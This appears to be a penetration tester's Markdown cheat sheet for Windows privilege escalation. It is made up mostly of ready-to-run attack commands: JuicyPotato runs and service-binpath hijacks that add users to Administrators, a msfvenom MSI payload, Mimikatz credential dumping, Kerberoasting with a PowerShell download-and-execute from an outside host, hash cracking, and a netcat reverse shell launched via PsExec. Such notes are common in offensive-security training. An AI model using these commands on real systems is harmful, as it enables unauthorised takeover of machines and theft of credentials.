# Privesc

## MS17-010 - Eternal Blue


## Abuse SeImpersonatePrivilege

```
➤ 1. Verify that 'SeImpersonatePrivilege' privilege is enabled.

C:\Users\Lexis>whoami /priv
Informations de privilèges
----------------------

Privilege Name                Description                                  State
============================= ============================================ =========
SeShutdownPrivilege           Stop the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                     Enabled
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set               Disabled

➤ 2. Import JuicyPotato on the victim

➤ 3. Basic attacks without specific CLSID

• Add a user in the administrators group
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t * -a "/c net localgroup administrators {MY_EXISTING_USER} /add"

• Execute a reverse shell as NT AUTHORITY\SYSTEM
.\JuicyPotato.exe -l 1337 -p C:\Users\public\rshell.exe -t *

➤ 4. Using specific CLSID

• helper : https://ohpe.it/juicy-potato/CLSID/

• Manual CLSID dectection based on OS version
https://ohpe.it/juicy-potato/CLSID/

• Automated CLSID detection scripts
.\GetCLSID.ps1
or 
.\clisd-detector.bat

• Add a user in the administrators group using the specific CLSID
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
```

## Unquoted Service Paths
```
➤ 0. Explanation
Windows would try to locate and execute programs in the following order:
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe

➤ 1. Find Services With Unquoted Paths
• Using sc
sc query
sc qc service name

• Using 
Using WMIC

➤ 2. Look for Binary_path_name (Binary with space) and for each of them, check if the path is unquoted ('').
Vulnerable example: C:\Program Files\Some Folder\Service.exe

➤ 3. Verify that we can write into one of the subfolder
icacls "C:\Program Files\Some Folder\"

➤ 4. Create a reverse shell named Some.exe in 'C:\Program Files\Some Folder\'

➤ 6. Restart the service linked with service.exe
sc stop SERVICENAME
sc start SERVICENAME
```

## Vulnerable Services
```
➤ 1. Find vulnerable services 
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
Output: RW PFNET SERVICE_ALL_ACCESS

➤ 2. View the configuration properties of the PFNet Service 
sc qc PFNet

➤ 2. Use the BINARY_PATH_NAME value to execute command (here: add new user in adminstrators group)

sc config PFNET binpath= "net user lexis P@ssword123! /add"
sc stop PFNET
sc start PFNET

sc config PFNET binpath= "net localgroup Administrators lexis /add"
sc stop PFNET
sc start PFNET
```

## AlwaysInstallElevated
```
➤ 0. Explanation
AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

➤ 1. check the values of these two registry entries (all need to be on 0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Output: AlwaysInstallElevated   REG_DWORD   0x1

➤ 2. Generate a MSI file which add our user in the Local Administrators group
msfvenom -p windows/adduser USER=lexis PASS=mypassword123! -f msi -o exploit.msi

➤ 3. Upload the MSI file on the victim

➤ 4. Executre the MSI file
msiexec /quiet /qn /i C:\Users\victim\Downloads\exploit.msi

Note : 
- /quiet = Suppress any messages to the user during installation
- /qn = No GUI
- /i = Regular (vs. administrative) installation
  
➤ 4. Verify that our user has been added in the localgroup Administrators
net localgroup Administrators
```

## Mimikatz
```
import-module .\Invoke-Mimikatz
Invoke-Mimikatz privilege::debug sekurlsa::logonpasswords
```

## Roast a SPN
```
➤ 1. Download Kerberoast
IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Invoke-Kerberoast.ps1')

➤ 2. Execute kerberoast
Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kbt-hash.txt

➤ 3. Delete the line break
cat kbt-hash.txt|tr -d "\r\n"|tee kbt-hash2.txt

➤ 4. Crack the ticket
hashcat -m 13100 -a 0 -o cracked.txt kbt-hash2.txt /usr/share/wordlists/rockyou.txt
```

## PsExec
```
.\PsExec64.exe -u lexis -p lexispassword \\COMPUTERHOSTNAME C:\users\public\documents\nc64.exe 192.168.0.1 443 -e C:\windows\system32\cmd.exe
```
